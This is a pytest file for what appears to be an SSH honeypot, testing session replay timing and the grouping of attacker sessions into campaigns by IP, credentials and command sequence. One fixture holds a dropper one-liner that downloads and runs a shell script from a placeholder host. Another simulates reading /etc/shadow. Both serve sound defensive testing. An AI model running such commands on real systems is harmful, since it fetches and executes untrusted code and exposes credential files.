"""
Tests for Feature: Session Replay & Cross-Session Attacker Correlation
=======================================================================
Run with:  pytest tests/test_replay_campaigns.py -v
"""
import os
import json
import tempfile
from datetime import datetime, timezone, timedelta

import aiosqlite
import pytest
import pytest_asyncio

from doppel.analytics.db import TelemetryDB


# ── Shared fixture ─────────────────────────────────────────────────────────────

@pytest_asyncio.fixture
async def db():
    """In-memory-equivalent: fresh temp DB per test, fully initialized."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = os.path.join(tmpdir, "test_telemetry.db")
        _db = TelemetryDB(db_path=db_path)
        await _db.initialize()
        yield _db


def _ts(offset_seconds: float = 0) -> str:
    """Return an ISO-8601 UTC timestamp offset from now."""
    return (datetime.now(timezone.utc) + timedelta(seconds=offset_seconds)).isoformat()


async def _seed_session(db: TelemetryDB, session_id: str, ip: str,
                        username: str, password: str,
                        commands: list[tuple[str, str, float]],
                        duration_ms: int | None = None):
    """
    Helper: create a session with commands that carry realistic timestamps.
    commands = [(cmd, output, delay_seconds_from_previous), ...]
    """
    await db.log_session_start(
        session_id=session_id,
        remote_ip=ip,
        remote_port=54321,
        username=username,
        password=password,
    )
    offset = 0.0
    for cmd, output, delay in commands:
        offset += delay
        # Manually insert with a controlled timestamp so replay math is deterministic
        ts = _ts(offset)
        async with aiosqlite.connect(db.db_path) as conn:
            await conn.execute(
                """INSERT INTO commands
                   (session_id, timestamp, cwd, command, output,
                    route_decision, technique_id, technique_name, tactics, threat_score,
                    duration_ms)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (session_id, ts, "/home/ubuntu", cmd, output,
                 "llm", None, None, json.dumps([]), 10, duration_ms),
            )
            await conn.commit()
    await db.log_session_end(session_id)


# ══════════════════════════════════════════════════════════════════════════════
# Feature 1 — Session Replay
# ══════════════════════════════════════════════════════════════════════════════

class TestSessionReplay:

    @pytest.mark.asyncio
    async def test_replay_returns_none_for_missing_session(self, db):
        result = await db.get_session_replay("nonexistent-session-id")
        assert result is None

    @pytest.mark.asyncio
    async def test_replay_first_delay_is_measured_from_login(self, db):
        await _seed_session(db, "s1", "10.0.0.1", "root", "toor",
                            [("whoami", "root", 0)])
        replay = await db.get_session_replay("s1")

        assert replay is not None
        assert len(replay["events"]) == 1
        assert 0 <= replay["events"][0]["delay_ms"] < 500

        await _seed_session(db, "s1b", "10.0.0.1", "root", "toor",
                            [("whoami", "root", 3)])
        replay = await db.get_session_replay("s1b")
        assert 2800 <= replay["events"][0]["delay_ms"] <= 3200

    @pytest.mark.asyncio
    async def test_replay_inter_command_delays_are_correct(self, db):
        # Commands spaced 2 s, 5 s, 1 s apart
        await _seed_session(db, "s2", "10.0.0.2", "ubuntu", "pass",
                            [
                                ("id",          "uid=0",   0),
                                ("uname -a",    "Linux",   2),
                                ("ls /etc",     "passwd",  5),
                                ("cat /etc/shadow", "...", 1),
                            ])
        replay = await db.get_session_replay("s2")

        assert replay is not None
        events = replay["events"]
        assert len(events) == 4
        assert events[0]["delay_ms"] < 500

        # Allow ±200 ms tolerance for timestamp precision
        assert 1800 <= events[1]["delay_ms"] <= 2200, f"Expected ~2000ms, got {events[1]['delay_ms']}"
        assert 4800 <= events[2]["delay_ms"] <= 5200, f"Expected ~5000ms, got {events[2]['delay_ms']}"
        assert  800 <= events[3]["delay_ms"] <= 1200, f"Expected ~1000ms, got {events[3]['delay_ms']}"

    @pytest.mark.asyncio
    async def test_replay_total_duration_ms(self, db):
        await _seed_session(db, "s3", "10.0.0.3", "admin", "admin",
                            [
                                ("whoami", "root", 0),
                                ("id",     "uid=0", 3),   # 3 s
                                ("exit",   "",      2),   # 2 s
                            ])
        replay = await db.get_session_replay("s3")
        # total = idle time plus response time across all events → ~5000 ms
        assert replay["total_duration_ms"] >= 4500

    @pytest.mark.asyncio
    async def test_replay_event_fields_present(self, db):
        await _seed_session(db, "s4", "10.0.0.4", "pi", "raspberry",
                            [("ls", "bin\nboot", 0)])
        replay = await db.get_session_replay("s4")
        event = replay["events"][0]
        for field in ("command", "output", "delay_ms", "duration_ms", "timestamp", "cwd"):
            assert field in event, f"Missing field: {field}"

    @pytest.mark.asyncio
    async def test_replay_event_order_is_chronological(self, db):
        cmds = [("cmd1", "out1", 0), ("cmd2", "out2", 1), ("cmd3", "out3", 1)]
        await _seed_session(db, "s5", "10.0.0.5", "user", "pw", cmds)
        replay = await db.get_session_replay("s5")
        names = [e["command"] for e in replay["events"]]
        assert names == ["cmd1", "cmd2", "cmd3"]

    @pytest.mark.asyncio
    async def test_replay_delay_excludes_previous_response_time(self, db):
        """Commands 4 s apart whose replies took 1 s each leave 3 s of idle time."""
        await _seed_session(db, "s6", "10.0.0.6", "user", "pw",
                            [("id", "uid", 0), ("ls", "bin", 4)],
                            duration_ms=1000)
        events = (await db.get_session_replay("s6"))["events"]
        assert events[1]["duration_ms"] == 1000
        assert 2800 <= events[1]["delay_ms"] <= 3200

    @pytest.mark.asyncio
    async def test_log_command_stores_receive_time_and_prompt(self, db):
        await db.log_session_start("s7", "10.0.0.7", 1, "ubuntu")
        await db.log_command(
            session_id="s7", cwd="/home/ubuntu", command="cd /tmp", output="",
            route_decision="builtin", timestamp="2026-11-04T10:00:00+00:00",
            duration_ms=250, prompt_user="ubuntu",
        )
        event = (await db.get_session_replay("s7"))["events"][0]
        assert event["timestamp"] == "2026-11-04T10:00:00+00:00"
        assert event["cwd"] == "/home/ubuntu"
        assert event["duration_ms"] == 250
        assert event["prompt_user"] == "ubuntu"


# ══════════════════════════════════════════════════════════════════════════════
# Feature 2 — Cross-Session Attacker Correlation / Campaigns
# ══════════════════════════════════════════════════════════════════════════════

class TestCampaignCorrelation:

    @pytest.mark.asyncio
    async def test_no_sessions_yields_zero_campaigns(self, db):
        count = await db.correlate_campaigns()
        assert count == 0
        campaigns = await db.get_campaigns()
        assert campaigns == []

    @pytest.mark.asyncio
    async def test_same_ip_groups_into_one_campaign(self, db):
        """Two sessions from the same IP → single campaign."""
        for sid in ("ip-a", "ip-b"):
            await _seed_session(db, sid, "1.2.3.4", "root", "hunter2",
                                [("whoami", "root", 0)])
        count = await db.correlate_campaigns()
        assert count == 1
        campaigns = await db.get_campaigns()
        assert len(campaigns) == 1
        assert campaigns[0]["session_count"] == 2

    @pytest.mark.asyncio
    async def test_same_credentials_groups_into_one_campaign(self, db):
        """Same distinctive username:password from different IPs → single campaign."""
        await _seed_session(db, "cred-a", "5.5.5.5", "admin", "Vk7#harbor2026",
                            [("id", "uid=0", 0)])
        await _seed_session(db, "cred-b", "6.6.6.6", "admin", "Vk7#harbor2026",
                            [("id", "uid=0", 0)])
        count = await db.correlate_campaigns()
        assert count == 1
        campaigns = await db.get_campaigns()
        assert campaigns[0]["link_reasons"] == ["shared_credentials"]

    @pytest.mark.asyncio
    async def test_generic_credentials_do_not_link_sessions(self, db):
        """Defaults, wordlist passwords and username reuse are sprayed by everyone."""
        pairs = [("admin", "Password1"), ("root", "toor"), ("pi", "raspberry"), ("test", "test")]
        for i, (user, pw) in enumerate(pairs):
            await _seed_session(db, f"gen-{i}a", f"12.0.{i}.1", user, pw, [("id", "uid", 0)])
            await _seed_session(db, f"gen-{i}b", f"12.0.{i}.2", user, pw, [("id", "uid", 0)])
        count = await db.correlate_campaigns()
        assert count == len(pairs) * 2
        assert await db.get_campaigns() == []

    @pytest.mark.asyncio
    async def test_same_command_fingerprint_groups_into_one_campaign(self, db):
        """Identical opening command sequences from different IPs/creds → single campaign."""
        shared_cmds = [("curl", "...", 0), ("wget", "...", 1), ("chmod +x", "...", 1)]
        await _seed_session(db, "fp-a", "7.7.7.1", "ubuntu", "aaa", shared_cmds)
        await _seed_session(db, "fp-b", "7.7.7.2", "ubuntu", "bbb", shared_cmds)
        count = await db.correlate_campaigns()
        assert count == 1
        campaigns = await db.get_campaigns()
        assert campaigns[0]["link_reasons"] == ["command_sequence"]

    @pytest.mark.asyncio
    async def test_generic_short_command_sequences_do_not_link(self, db):
        """Two short manual sessions that both ran ls/pwd are not a campaign."""
        await _seed_session(db, "short-a", "13.0.0.1", "u1", "Qz8!lantern",
                            [("ls", "", 0), ("pwd", "", 1)])
        await _seed_session(db, "short-b", "13.0.0.2", "u2", "Rq3!compass",
                            [("ls", "", 0), ("pwd", "", 1)])
        assert await db.correlate_campaigns() == 2

    @pytest.mark.asyncio
    async def test_same_commands_in_different_order_do_not_link(self, db):
        """Command sequences must match in order, not just share command names."""
        await _seed_session(db, "ord-a", "14.0.0.1", "u1", "Qz8!lantern",
                            [("cat a", "", 0), ("cd b", "", 1), ("ls c", "", 1)])
        await _seed_session(db, "ord-b", "14.0.0.2", "u2", "Rq3!compass",
                            [("ls x", "", 0), ("cat y", "", 1), ("cd z", "", 1)])
        assert await db.correlate_campaigns() == 2

    @pytest.mark.asyncio
    async def test_identical_long_one_liner_links_sessions(self, db):
        """Dropper bots often send one chained command, which is itself a fingerprint."""
        dropper = "cd /tmp; wget http://203.0.113.9/x.sh; chmod +x x.sh; ./x.sh"
        await _seed_session(db, "drop-a", "15.0.0.1", "root", "toor", [(dropper, "", 0)])
        await _seed_session(db, "drop-b", "15.0.0.2", "root", "toor", [(dropper, "", 0)])
        assert await db.correlate_campaigns() == 1

    @pytest.mark.asyncio
    async def test_unrelated_sessions_form_separate_campaigns(self, db):
        """Sessions sharing nothing → each in its own campaign."""
        await _seed_session(db, "uniq-1", "11.0.0.1", "user1", "pw1",
                            [("ls",  "bin", 0)])
        await _seed_session(db, "uniq-2", "11.0.0.2", "user2", "pw2",
                            [("pwd", "/",   0)])
        await _seed_session(db, "uniq-3", "11.0.0.3", "user3", "pw3",
                            [("id",  "uid", 0)])
        count = await db.correlate_campaigns()
        assert count == 3

    @pytest.mark.asyncio
    async def test_campaign_ids_are_stable_across_calls(self, db):
        """Running correlate_campaigns() twice yields the same campaign_id values."""
        for sid in ("stable-a", "stable-b"):
            await _seed_session(db, sid, "9.9.9.9", "root", "root",
                                [("whoami", "root", 0)])
        await db.correlate_campaigns()
        campaigns_1 = await db.get_campaigns()

        await db.correlate_campaigns()
        campaigns_2 = await db.get_campaigns()

        ids_1 = {c["campaign_id"] for c in campaigns_1}
        ids_2 = {c["campaign_id"] for c in campaigns_2}
        assert ids_1 == ids_2, "Campaign IDs must be stable (deterministic hash)"

    @pytest.mark.asyncio
    async def test_campaign_id_unchanged_when_new_session_joins(self, db):
        """A campaign keeps its ID when later sessions are linked into it."""
        await _seed_session(db, "grow-a", "16.0.0.1", "u", "Hx5!meadow", [("id", "", 0)])
        await _seed_session(db, "grow-b", "16.0.0.1", "u", "Hx5!meadow", [("id", "", 0)])
        await db.correlate_campaigns()
        before = (await db.get_campaigns())[0]["campaign_id"]

        await _seed_session(db, "grow-c", "16.0.0.1", "u", "Hx5!meadow", [("id", "", 0)])
        await db.correlate_campaigns()
        campaigns = await db.get_campaigns()
        assert len(campaigns) == 1
        assert campaigns[0]["session_count"] == 3
        assert campaigns[0]["campaign_id"] == before

    @pytest.mark.asyncio
    async def test_campaign_summary_fields(self, db):
        """get_campaigns() returns expected summary fields."""
        for sid in ("fld-a", "fld-b"):
            await _seed_session(db, sid, "20.0.0.1", "test", "test",
                                [("whoami", "root", 0)])
        await db.correlate_campaigns()
        campaigns = await db.get_campaigns()
        assert len(campaigns) == 1
        c = campaigns[0]
        for field in ("campaign_id", "session_count", "unique_ips",
                      "peak_threat", "first_seen", "last_seen", "link_reasons"):
            assert field in c, f"Missing campaign field: {field}"

    @pytest.mark.asyncio
    async def test_get_campaigns_lists_only_multi_session_groups(self, db):
        await _seed_session(db, "solo", "17.0.0.1", "u1", "Jw2!orchard", [("id", "", 0)])
        await _seed_session(db, "pair-a", "17.0.0.2", "u2", "Kp4!glacier", [("id", "", 0)])
        await _seed_session(db, "pair-b", "17.0.0.2", "u3", "Lm6!canyon", [("id", "", 0)])
        assert await db.correlate_campaigns() == 2
        campaigns = await db.get_campaigns()
        assert len(campaigns) == 1
        assert campaigns[0]["ips"] == ["17.0.0.2"]
        assert campaigns[0]["usernames"] == ["u2", "u3"]
        assert len(await db.get_campaigns(min_sessions=1)) == 2

        members = await db.get_campaign_sessions(campaigns[0]["campaign_id"])
        assert {m["session_id"] for m in members} == {"pair-a", "pair-b"}
        assert all("command_count" in m for m in members)

    @pytest.mark.asyncio
    async def test_campaign_id_written_to_session_row(self, db):
        """After correlation, each session row has a non-null campaign_id."""
        await _seed_session(db, "row-check", "30.0.0.1", "u", "p",
                            [("id", "uid=0", 0)])
        await db.correlate_campaigns()
        details = await db.get_session_details("row-check")
        assert details.get("campaign_id") is not None

    @pytest.mark.asyncio
    async def test_mixed_signals_union_find_transitivity(self, db):
        """
        A shares IP with B; B shares credentials with C; C is otherwise unique.
        All three should land in the same campaign (transitivity via Union-Find).
        """
        # A + B: same IP
        await _seed_session(db, "trans-a", "50.0.0.1", "ua", "pa",
                            [("ls", "bin", 0)])
        await _seed_session(db, "trans-b", "50.0.0.1", "ub", "pb",
                            [("ls", "bin", 0)])
        # B + C: same credential as B — note B used "ub:pb"
        await _seed_session(db, "trans-c", "50.0.0.9", "ub", "pb",
                            [("id", "uid", 0)])

        count = await db.correlate_campaigns()
        assert count == 1, "Transitive link should merge all three into one campaign"
        campaigns = await db.get_campaigns()
        assert campaigns[0]["link_reasons"] == ["shared_ip", "shared_credentials"]


# ══════════════════════════════════════════════════════════════════════════════
# API endpoint smoke tests (no running server needed — FastAPI TestClient)
# ══════════════════════════════════════════════════════════════════════════════

@pytest.fixture
def api_client(tmp_path, monkeypatch):
    """TestClient backed by a fresh temp DB; global controller state is restored afterwards."""
    from fastapi.testclient import TestClient
    from doppel.dashboard.app import app, controller

    db_path = str(tmp_path / "test.db")
    monkeypatch.setattr(controller.config.llm, "mock_mode", True)
    monkeypatch.setattr(controller.config.analytics, "db_path", db_path)
    monkeypatch.setattr(controller.config.access, "dashboard_allowed_ips", ["127.0.0.1"])
    monkeypatch.setattr(controller, "db", TelemetryDB(db_path=db_path))

    # Entering the context runs the startup hook, which initializes the DB
    with TestClient(app, client=("127.0.0.1", 50000)) as client:
        yield client


def test_replay_endpoint_404_on_missing_session(api_client):
    r = api_client.get("/api/sessions/does-not-exist/replay")
    assert r.status_code == 404


def test_campaigns_endpoint_returns_structure(api_client):
    r = api_client.get("/api/campaigns")
    assert r.status_code == 200
    data = r.json()
    assert "campaign_count" in data
    assert "campaigns" in data
    assert isinstance(data["campaigns"], list)


def test_campaign_detail_404_on_missing(api_client):
    r = api_client.get("/api/campaigns/cmp-nonexistent")
    assert r.status_code == 404


def test_campaign_endpoints_return_linked_sessions(api_client):
    from doppel.dashboard.app import controller

    async def seed():
        for sid in ("api-a", "api-b"):
            await _seed_session(controller.db, sid, "18.0.0.1", "u", "Nb9!harvest",
                                [("id", "", 0)])
    api_client.portal.call(seed)

    data = api_client.get("/api/campaigns").json()
    assert data["campaign_count"] == 1
    campaign = data["campaigns"][0]
    assert campaign["link_reasons"] == ["shared_ip", "shared_credentials"]

    detail = api_client.get(f"/api/campaigns/{campaign['campaign_id']}").json()
    assert {s["session_id"] for s in detail["sessions"]} == {"api-a", "api-b"}
    assert all(s["is_active"] is False for s in detail["sessions"])


def test_replay_endpoint_returns_events(api_client):
    from doppel.dashboard.app import controller

    async def seed():
        await _seed_session(controller.db, "api-replay", "18.0.0.2", "u", "p",
                            [("id", "uid", 0), ("ls", "bin", 2)])
    api_client.portal.call(seed)

    data = api_client.get("/api/sessions/api-replay/replay").json()
    assert [e["command"] for e in data["events"]] == ["id", "ls"]
    assert data["total_duration_ms"] >= 1800
